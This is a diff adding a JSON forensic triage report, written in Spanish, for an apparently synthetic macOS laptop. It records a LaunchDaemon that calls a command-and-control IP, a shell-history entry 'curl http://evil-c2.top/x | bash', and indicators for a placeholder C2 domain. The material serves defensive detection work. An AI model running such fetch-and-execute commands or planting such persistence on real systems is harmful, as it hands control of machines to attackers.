@@ -1,0 +1,366 @@
+{
+  "case": {
+    "name": "IR-2026/07/15-MPRE-08",
+    "examiner": "C. Villalba",
+    "os": "macOS",
+    "description": "Portátil de diseño (preproducción): LaunchDaemon no confiable con RunAtLoad y descarga en cuarentena desde dominio sospechoso.",
+    "generated_utc": "2026-07-15T07:34:11Z"
+  },
+  "host": {
+    "hostname": "MB-DESIGN-02",
+    "os": "macOS 14.5 (Sonoma)",
+    "os_version": "#1 SMP PREEMPT_DYNAMIC @0",
+    "architecture": "x86_64",
+    "python": "3.12.3"
+  },
+  "generated_utc": "2026-07-15T07:34:11Z",
+  "assessment": {
+    "risk_score": 31,
+    "verdict_key": "sospechoso",
+    "verdict": "Actividad sospechosa",
+    "verdict_color": "#E0A34A",
+    "verdict_text": "Se han detectado indicadores que merecen investigación, pero no concluyentes por sí solos.",
+    "confidence": 100,
+    "confidence_tier": "alta",
+    "reasons": [
+      {
+        "label": "LaunchDaemon/Agent sospechoso (persistencia)",
+        "count": 1,
+        "points": 15,
+        "tactic": "Persistence",
+        "attack": "T1543.001"
+      },
+      {
+        "label": "Comando de shell sospechoso (curl|bash, etc.)",
+        "count": 1,
+        "points": 8,
+        "tactic": "Execution",
+        "attack": "T1059.004"
+      },
+      {
+        "label": "Descarga de herramienta/ejecutable",
+        "count": 1,
+        "points": 8,
+        "tactic": "Command and Control",
+        "attack": "T1105"
+      }
+    ],
+    "attack_techniques": [
+      {
+        "attack": "T1059.004",
+        "tactic": "Execution",
+        "label": "Comando de shell sospechoso (curl|bash, etc.)",
+        "count": 1
+      },
+      {
+        "attack": "T1543.001",
+        "tactic": "Persistence",
+        "label": "LaunchDaemon/Agent sospechoso (persistencia)",
+        "count": 1
+      },
+      {
+        "attack": "T1105",
+        "tactic": "Command and Control",
+        "label": "Descarga de herramienta/ejecutable",
+        "count": 1
+      }
+    ],
+    "signals_triggered": 3
+  },
+  "iocs": [
+    {
+      "type": "domain",
+      "value": "evil-c2.top",
+      "defanged": "evil-c2[.]top",
+      "count": 3,
+      "private": false,
+      "sources": [
+        "browsers",
+        "quarantine",
+        "shell"
+      ]
+    },
+    {
+      "type": "ipv4",
+      "value": "91.219.236.14",
+      "defanged": "91[.]219[.]236[.]14",
+      "count": 2,
+      "private": false,
+      "sources": [
+        "logs",
+        "persistence"
+      ]
+    },
+    {
+      "type": "url",
+      "value": "http://evil-c2.top/x",
+      "defanged": "hxxp://evil-c2[.]top/x",
+      "count": 1,
+      "private": false,
+      "sources": [
+        "shell"
+      ]
+    },
+    {
+      "type": "url",
+      "value": "http://evil-c2.top/panel",
+      "defanged": "hxxp://evil-c2[.]top/panel",
+      "count": 1,
+      "private": false,
+      "sources": [
+        "browsers"
+      ]
+    },
+    {
+      "type": "url",
+      "value": "http://evil-c2.top/invoice.dmg",
+      "defanged": "hxxp://evil-c2[.]top/invoice[.]dmg",
+      "count": 1,
+      "private": false,
+      "sources": [
+        "quarantine"
+      ]
+    }
+  ],
+  "integrity": {
+    "artifacts_total": 7,
+    "artifacts_hashed": 7
+  },
+  "findings": [
+    {
+      "level": "warn",
+      "text": "1 descarga(s) registrada(s) en cuarentena (Gatekeeper)"
+    },
+    {
+      "level": "crit",
+      "text": "1 LaunchAgent/Daemon con rutas sospechosas (/tmp, curl, osascript…)"
+    },
+    {
+      "level": "warn",
+      "text": "1 comando(s) sospechoso(s) en el historial"
+    }
+  ],
+  "chain_of_custody": [
+    {
+      "category": "persistence",
+      "source": "/tmp/fakemac/Library/LaunchDaemons/com.apple.softwareupdated.plist",
+      "collected_utc": "2026-07-15T07:34:11Z",
+      "status": "ok",
+      "artifact": "artifacts/persistence/com.apple.softwareupdated.plist",
+      "method": "direct",
+      "size": 377,
+      "md5": "479ca3aa277df393a9c984e862fb48b8",
+      "sha256": "4425f79d3990e634265d820809639feb4d598b38df5a67a649bc23874dbf65ea"
+    },
+    {
+      "category": "persistence",
+      "source": "/tmp/fakemac/Library/LaunchDaemons/com.evil.helper.plist",
+      "collected_utc": "2026-07-15T07:34:11Z",
+      "status": "ok",
+      "artifact": "artifacts/persistence/com.evil.helper.plist",
+      "method": "direct",
+      "size": 405,
+      "md5": "632f879d48dc242e00a7d10cb3f28bd7",
+      "sha256": "fe52b2b58415f35cc1ef70e4d22c2d21d02d8c2607bd2a2b0991bdc9d04fef69"
+    },
+    {
+      "category": "shell",
+      "source": "/tmp/fakemac/Users/jdoe/.zsh_history",
+      "collected_utc": "2026-07-15T07:34:11Z",
+      "status": "ok",
+      "artifact": "artifacts/shell/jdoe_zsh_history",
+      "method": "direct",
+      "size": 66,
+      "md5": "668c3fae8521ac2070b2656d55463e6a",
+      "sha256": "c7febf99c78ed6c7f0647c950ba0b68dd1ffcaee976b6f93f6f6c4394d2f6799"
+    },
+    {
+      "category": "browsers",
+      "source": "/tmp/fakemac/Users/jdoe/Library/Safari/History.db",
+      "collected_utc": "2026-07-15T07:34:11Z",
+      "status": "ok",
+      "artifact": "artifacts/browsers/jdoe_Safari_History.db",
+      "method": "direct",
+      "size": 12288,
+      "md5": "cf8855c1f051589d99ec01ea9a4f4714",
+      "sha256": "5d577e5ec0dbab3a2421177e8f703a7b835a519057e2fb98d0ea4448e6c339bd"
+    },
+    {
+      "category": "quarantine",
+      "source": "/tmp/fakemac/Users/jdoe/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2",
+      "collected_utc": "2026-07-15T07:34:11Z",
+      "status": "ok",
+      "artifact": "artifacts/quarantine/jdoe_QuarantineEventsV2",
+      "method": "direct",
+      "size": 8192,
+      "md5": "00c635f506423fe02556ecd64aeb75d3",
+      "sha256": "dcde7cb81759146a78ad9df39975db555c10b4df98fb657e28c908147a34d65d"
+    },
+    {
+      "category": "accounts",
+      "source": "/tmp/fakemac/var/db/dslocal/nodes/Default/users/jdoe.plist",
+      "collected_utc": "2026-07-15T07:34:11Z",
+      "status": "ok",
+      "artifact": "artifacts/accounts/jdoe.plist",
+      "method": "direct",
+      "size": 438,
+      "md5": "2cddc97e8a488a049df3b75f28769228",
+      "sha256": "30bb338f853fd08852c5661cc976f6131b567c4e669dd156ab407a7c4eece8a0"
+    },
+    {
+      "category": "logs",
+      "source": "/tmp/fakemac/var/log/system.log",
+      "collected_utc": "2026-07-15T07:34:11Z",
+      "status": "ok",
+      "artifact": "artifacts/logs/system.log",
+      "method": "direct",
+      "size": 76,
+      "md5": "ba9957baabe5eb25f8055fe50cdfe86d",
+      "sha256": "55217fc6c94aff1ed1294c7a44556389cf42ad1c7b9110e27b1c482ed5a9f195"
+    }
+  ],
+  "artifacts": {
+    "persistence": [
+      {
+        "timestamp": "2026-07-14T20:14:32Z",
+        "kind": "launchd",
+        "summary": "com.apple.softwareupdated",
+        "detail": "/usr/libexec/softwareupdated",
+        "severity": "info",
+        "run_at_load": true
+      },
+      {
+        "timestamp": "2026-07-14T20:14:32Z",
+        "kind": "launchd",
+        "summary": "com.evil.helper",
+        "detail": "/tmp/helper -c 91.219.236.14",
+        "severity": "crit",
+        "run_at_load": true
+      }
+    ],
+    "shell": [
+      {
+        "timestamp": "2025-07-14T02:00:00Z",
+        "kind": "comando",
+        "summary": "ls",
+        "detail": "jdoe",
+        "severity": "info"
+      },
+      {
+        "timestamp": "2025-07-14T02:01:00Z",
+        "kind": "comando",
+        "summary": "curl http://evil-c2.top/x | bash",
+        "detail": "jdoe",
+        "severity": "warn"
+      }
+    ],
+    "browsers": [
+      {
+        "timestamp": "2024-07-06T23:06:40Z",
+        "kind": "visita",
+        "summary": "http://evil-c2.top/panel",
+        "detail": "C2 Panel",
+        "severity": "info",
+        "visit_count": 3,
+        "source": "jdoe_Safari_History.db"
+      }
+    ],
+    "quarantine": [
+      {
+        "timestamp": "2024-07-06T23:08:20Z",
+        "kind": "cuarentena",
+        "summary": "http://evil-c2.top/invoice.dmg",
+        "detail": "vía Safari",
+        "severity": "warn",
+        "source": "jdoe_QuarantineEventsV2"
+      }
+    ],
+    "accounts": [
+      {
+        "timestamp": "2026-07-14T20:14:32Z",
+        "kind": "cuenta local",
+        "summary": "jdoe (uid 501)",
+        "detail": "/bin/zsh · /Users/jdoe",
+        "severity": "info"
+      }
+    ],
+    "logs": [
+      {
+        "timestamp": "2026-07-14T02:00:09Z",
+        "kind": "system.log",
+        "summary": "Accepted publickey for root from 91.219.236.14",
+        "detail": "system.log",
+        "severity": "info"
+      }
+    ],
+    "unified_log": []
+  },
+  "parse_errors": [],
+  "timeline_count": 8,
+  "timeline": [
+    {
+      "timestamp": "2026-07-14T20:14:32Z",
+      "source": "Persistencia",
+      "type": "launchd",
+      "summary": "com.apple.softwareupdated",
+      "detail": "/usr/libexec/softwareupdated",
+      "severity": "info"
+    },
+    {
+      "timestamp": "2026-07-14T20:14:32Z",
+      "source": "Persistencia",
+      "type": "launchd",
+      "summary": "com.evil.helper",
+      "detail": "/tmp/helper -c 91.219.236.14",
+      "severity": "crit"
+    },
+    {
+      "timestamp": "2026-07-14T20:14:32Z",
+      "source": "Cuentas",
+      "type": "cuenta local",
+      "summary": "jdoe (uid 501)",
+      "detail": "/bin/zsh · /Users/jdoe",
+      "severity": "info"
+    },
+    {
+      "timestamp": "2026-07-14T02:00:09Z",
+      "source": "Logs",
+      "type": "system.log",
+      "summary": "Accepted publickey for root from 91.219.236.14",
+      "detail": "system.log",
+      "severity": "info"
+    },
+    {
+      "timestamp": "2025-07-14T02:01:00Z",
+      "source": "Shell",
+      "type": "comando",
+      "summary": "curl http://evil-c2.top/x | bash",
+      "detail": "jdoe",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2025-07-14T02:00:00Z",
+      "source": "Shell",
+      "type": "comando",
+      "summary": "ls",
+      "detail": "jdoe",
+      "severity": "info"
+    },
+    {
+      "timestamp": "2024-07-06T23:08:20Z",
+      "source": "Cuarentena",
+      "type": "cuarentena",
+      "summary": "http://evil-c2.top/invoice.dmg",
+      "detail": "vía Safari",
+      "severity": "warn"
+    },
+    {
+      "timestamp": "2024-07-06T23:06:40Z",
+      "source": "Navegador",
+      "type": "visita",
+      "summary": "http://evil-c2.top/panel",
+      "detail": "C2 Panel",
+      "severity": "info"
+    }
+  ]
+}
